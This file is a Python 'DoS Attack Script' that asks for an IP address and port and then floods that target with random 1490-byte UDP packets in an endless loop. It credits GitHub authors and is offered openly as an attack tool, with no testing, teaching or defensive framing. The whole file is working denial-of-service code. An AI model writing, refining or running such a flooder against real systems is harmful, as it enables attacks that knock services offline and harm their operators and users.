import sys
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("DoS Attack Script")
print("Original Author   : HA-MRX @ https://github.com/Ha3MrX")
print("Remaker           : Fimall @ https://github.com/ItsFimall")
print("Repo              : https://github.com/ItsFimall/DoS-Attack")

ip = input("IP     : ")
port = int(input("Port   : "))

if port < 1 or port > 65535:
    print("Port range error")
    sys.exit()

sent = 0

while True:
    try:
        bytes = random._urandom(1490)  # Randomized Bytes
        _socket.sendto(bytes, (ip, port))  # Socket send packets
        sent = sent + 1
        print(f"Sent {sent} packet to {ip} through port: {port}")
    except KeyboardInterrupt:
        print("User interrupted the attack.")
        sys.exit()
    except Exception as e:
        print(f"An error occurred: {e}")
